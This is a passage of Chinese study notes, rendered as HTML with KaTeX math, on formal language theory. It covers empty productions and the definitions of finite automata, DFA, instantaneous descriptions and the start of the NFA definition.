\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>加入到产生式中，并且规定这样不会影响到文法的类型。</p><p><img src="https://upyun.wuuconix.link/image-20211107183643756.png" alt="空语句" /></p><p>同样的，加入空语句也不会影响语言的类型。去掉也不会233。</p><p><img src="https://upyun.wuuconix.link/image-20211107183801419.png" alt="加入空语句不会影响语言的类型" />、</p><p><img src="https://upyun.wuuconix.link/image-20211107183832629.png" alt="去掉空语句" /></p><h2 id="第三章有穷状态自动机"><a class="markdownIt-Anchor" href="#第三章有穷状态自动机"></a> 第三章——有穷状态自动机</h2><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M=(Q, \sum, \delta,q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mopen">(</span><span class="mord mathdefault">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span>。    finite automanton FA</p><p>Q表示状态的非空有穷集合。 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">\forall(q)\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∀</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>，q称为M的一个状态 state。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>表示输入字母表 input alphabet。输入字符串都是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的字符串。</p><blockquote><p>用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>来表示字母表实际上从第一章就开始了</p></blockquote><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">q_0\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>，是M的开始状态 initial state。也可叫做初始状态或者启动状态。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span> 状态转移函数 transition function。有时候又叫做状态转移函数函数或者移动函数。</p><p><img src="https://upyun.wuuconix.link/image-20211107185928841.png" alt="状态转移函数" /></p><p>F <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo>⊆</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">F\subseteq Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>  是M的终止状态 final  state集合。 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>q</mi><mo>∈</mo><mi>F</mi></mrow><annotation encoding="application/x-tex">\forall q\in F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span></span>，称q为M的终止状态，又称为接受状态 accept state。</p><h3 id="fa的两种表示法"><a class="markdownIt-Anchor" href="#fa的两种表示法"></a> FA的两种表示法</h3><p>状态转移表和状态转换图。</p><p><img src="https://upyun.wuuconix.link/image-20211107190721091.png" alt="FA" /></p><p><img src="https://upyun.wuuconix.link/image-20211107190813626.png" alt="状态转移表" /></p><p><img src="https://upyun.wuuconix.link/image-20211107190857485.png" alt="状态转移图" /></p><p>状态转移表实际上就是把所有的状态列出来，然后把它们输入不同字符下对应的结果都写下来。然后在开始状态和终止状态前面进行一个标识。</p><p>状态转移图中每个状态都是一个顶点。转化的过程用一个弧来标识，弧上面标识的内容标识输入的字符。终止状态用双层圈标出。开始状态用一个S指向，表示start之意。</p><h3 id="对delta的扩充"><a class="markdownIt-Anchor" href="#对delta的扩充"></a> 对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>的扩充</h3><p>之前将的状态转移函数，都是一个接收一个输入字符然后转移到另一个状态。如果想要一次性接收多个字符，然后直接得到状态结果呢？</p><p>这就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span></span></span></span>。</p><p><img src="https://upyun.wuuconix.link/image-20211107191643243.png" alt="扩充1" /></p><p><img src="https://upyun.wuuconix.link/image-20211107191704310.png" alt="扩充2" /></p><p>实际上两者没有任何区别，只是迭代的关系。如果我们一次性接收了多个字符，那就用迭代的方式一个个来处理，从左往右，进行状态的转化。</p><p>所以我们可以将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;">^</span></span></span></span></span></span></span></span></span>简记为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span></p><h3 id="确定的有穷状态自动机-dfa"><a class="markdownIt-Anchor" href="#确定的有穷状态自动机-dfa"></a> 确定的有穷状态自动机 DFA</h3><p>对于任意的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo>∈</mo><mi>Q</mi></mrow><annotation encoding="application/x-tex">q\in Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>∈</mo><mo>∑</mo></mrow><annotation encoding="application/x-tex">a\in\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\delta(q,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span>均有确定的值，所以将这种FA称为确定的有穷状态自动机  deterministic finite automanton DFA。</p><p><img src="https://upyun.wuuconix.link/image-20211107192241731.png" alt="image-20211107192241731" /></p><h3 id="一些结论"><a class="markdownIt-Anchor" href="#一些结论"></a> 一些结论</h3><ol><li><p>一般来说定义FA时，不用具体写出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M=(Q,\sum,\delta,q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mopen">(</span><span class="mord mathdefault">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span>这种复杂的东西。</p><p>只需要给出一个直观的状态转移图即可。从状态转移图上我们可以清楚的看到状态们，输入字符们，转移们，开始状态和接收状态们。</p></li><li><p>对于DFA来说，每个顶点的出度恰好就是输入字母表中所含的字符个数。</p><p>因为DFA是确定的有穷状态自动机，它的每个状态对于任何的输入字符都又一个确定的状态。故它一定会有输入字母表中所含字母个数条边。</p></li><li><p>字符x被FA M所接受的充要条件是 在M的状态转移图中存在 一条从开始状态到某一终止状态的有向路，该有向路上从第一条边到最后一条边的标记依次并置而构成字符串x。</p></li><li><p>一个FA有且只有一个初始状态，但是可能有多个终止状态。</p><p>比如一下这个FA就有两个终止状态。</p><p><img src="https://upyun.wuuconix.link/image-20211107193800526.png" alt="状态" /></p></li></ol><h3 id="即时描述-instantaneous-description-id"><a class="markdownIt-Anchor" href="#即时描述-instantaneous-description-id"></a> 即时描述 instantaneous description, ID。</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msup><mo>∑</mo><mo>∗</mo></msup><mo separator="true">,</mo><mi>δ</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">x,y \in \sum^*,\delta(q_0,x)=q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>，xqy称为M的一个即时描述。表示xy是M正在处理的一个字符串，x引导M从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>（即开始状态）启动并到达状态q，M但概念正注释着y的首字符。</p><p>如果xqay是M的一个即时描述，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">\delta(q,a)=p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span></span></span></span></p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi>q</mi><mi>a</mi><mi>y</mi><msub><mi mathvariant="normal">├</mi><mi>M</mi></msub><mtext> </mtext><mi>x</mi><mi>a</mi><mi>p</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">xqay ├_M\ xapy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord"><span class="mord">├</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">x</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211107195913924.png" alt="├" /></p><p><img src="https://upyun.wuuconix.link/image-20211107195956165.png" alt="├ 省略M" /></p><p>这和之前规约<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span></span></span></span>省略G一样，这里可以省略M。</p><h3 id="fa和dfa的区别"><a class="markdownIt-Anchor" href="#fa和dfa的区别"></a> FA和DFA的区别</h3><ol><li><p>FA并不是对于所有的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>Q</mi><mo>×</mo><mo>∑</mo><mo separator="true">,</mo><mtext> </mtext><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(q,a)\in Q\times\sum,\ \delta(q,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span>都有状态与它对应。</p><blockquote><p>也就是它的出度可以小于输入表字符的个数</p></blockquote></li><li><p>FA并不是对于所有的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>Q</mi><mo>×</mo><mo>∑</mo><mo separator="true">,</mo><mi>δ</mi><mo stretchy="false">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(q,a)\in Q\times\sum, \delta(q,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span> 只对应一个状态</p><blockquote><p>第一条性质还好理解。这条就更牛逼了，也就是说输入一个字符，进行状态转移的时候可能会进入两个状态中去，非常神奇。</p></blockquote></li><li><p>FA在任意时刻可以处于有穷多个状态</p></li><li><p>FA具有智能</p></li></ol><h3 id="nfa的形式定义"><a class="markdownIt-Anchor" href="#nfa的形式定义"></a> NFA的形式定义</h3><p>不确定的有穷状态自动机  non-deterministic finite automanton NFA</p><p>M是一个五元组 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><mo stretchy="false">(</mo><mi>Q</mi><mo separator="true">,</mo><mo>∑</mo><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M=(Q, \sum, \delta,q_0,F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mopen">(</span><span class="mord mathdefault">Q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span 